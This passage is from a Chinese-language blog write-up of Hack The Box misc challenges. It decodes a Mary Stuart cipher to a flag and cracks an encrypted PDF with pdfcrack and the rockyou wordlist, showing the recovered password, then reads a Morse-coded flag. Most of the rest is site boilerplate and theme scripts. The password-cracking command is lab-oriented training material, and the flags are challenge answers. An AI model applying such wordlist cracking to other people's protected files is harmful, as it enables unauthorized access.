=&gt; Quit (you will lose your files!)                     </span><br><span class="line">&gt;&gt;&gt; Choose an option: 5</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="The-secret-of-a-Queen"><a href="#The-secret-of-a-Queen" class="headerlink" title="The secret of a Queen"></a>The secret of a Queen</h1><p><a target="_blank" rel="noopener" href="https://www.dcode.fr/mary-stuart-code">https://www.dcode.fr/mary-stuart-code</a></p>
+<p>HTB{THEBABINGTONPLOT}</p>
+<h1 id="0ld-is-g0ld"><a href="#0ld-is-g0ld" class="headerlink" title="0ld is g0ld"></a>0ld is g0ld</h1><p>得到一个加密的pdf，爆破密码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/Desktop]</span><br><span class="line">└─$ pdfcrack -w /usr/share/wordlists/rockyou.txt -f "0ld is g0ld.pdf" </span><br><span class="line">PDF version 1.6</span><br><span class="line">Security Handler: Standard</span><br><span class="line">V: 2</span><br><span class="line">R: 3</span><br><span class="line">P: -1060</span><br><span class="line">Length: 128</span><br><span class="line">Encrypted Metadata: True</span><br><span class="line">FileID: 5c8f37d2a45eb64e9dbbf71ca3e86861</span><br><span class="line">U: 9cba5cfb1c536f1384bba7458aae3f8100000000000000000000000000000000</span><br><span class="line">O: 702cc7ced92b595274b7918dcb6dc74bedef6ef851b4b4b5b8c88732ba4dac0c</span><br><span class="line">Average Speed: 64605.2 w/s. Current Word: 'sheena1234'</span><br><span class="line">Average Speed: 64316.3 w/s. Current Word: 'yorrej'</span><br><span class="line">Average Speed: 64684.4 w/s. Current Word: 'sexykelly4'</span><br><span class="line">Average Speed: 64416.8 w/s. Current Word: 'nearykalyan'</span><br><span class="line">Average Speed: 66907.1 w/s. Current Word: 'kobngangko'</span><br><span class="line">found user-password: 'jumanji69'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在PDF底下有一行摩斯电码，解密得到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/09/07/HTBmisc(2)/">http://mikannse.space/2024/09/07/HTBmisc(2)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/misc/">misc</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/08/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%89%E5%9B%9B)%E4%B9%8BHTBGiddy/" title="打靶记录(一三四)之HTBGiddy"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">打靶记录(一三四)之HTBGiddy</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/07/HTBmisc(1)%E7%BC%96%E7%A8%8B%E9%A2%98/" title="HTBmisc(1)编程题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HTBmisc(1)编程题</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/09/12/HTBSherlockBFT/" title="HTBSherlockBFT"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-12</div><div class="title">HTBSherlockBFT</div></div></a></div><div><a href="/2024/09/16/HTBSherlockOpTinselTrace-3/" title="HTBSherlockOpTinselTrace-3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-16</div><div class="title">HTBSherlockOpTinselTrace-3</div></div></a></div><div><a href="/2024/09/14/HTBSherlockOre/" title="HTBSherlockOre"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-14</div><div class="title">HTBSherlockOre</div></div></a></div><div><a href="/2024/09/07/HTBmisc(1)%E7%BC%96%E7%A8%8B%E9%A2%98/" title="HTBmisc(1)编程题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-07</div><div class="title">HTBmisc(1)编程题</div></div></a></div><div><a href="/2024/09/11/HTB%E8%93%9D%E9%98%9F%E8%B7%AF%E5%BE%84%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/" title="HTB蓝队路径取证分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-11</div><div class="title">HTB蓝队路径取证分析</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Locked-Away"><span class="toc-number">1.</span> <span class="toc-text">Locked Away</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Compressor"><span class="toc-number">2.</span> <span class="toc-text">Compressor</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SecretRezipe"><span class="toc-number">3.</span> <span class="toc-text">SecretRezipe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Micro-Storage"><span class="toc-number">4.</span> <span class="toc-text">Micro Storage</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#The-secret-of-a-Queen"><span class="toc-number">5.</span> <span class="toc-text">The secret of a Queen</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0ld-is-g0ld"><span class="toc-number">6.</span> <span class="toc-text">0ld is g0ld</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2024/09/07/HTBmisc(2)/'
+    this.page.identifier = '/2024/09/07/HTBmisc(2)/'
+    this.page.title = 'HTBmisc(2)'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
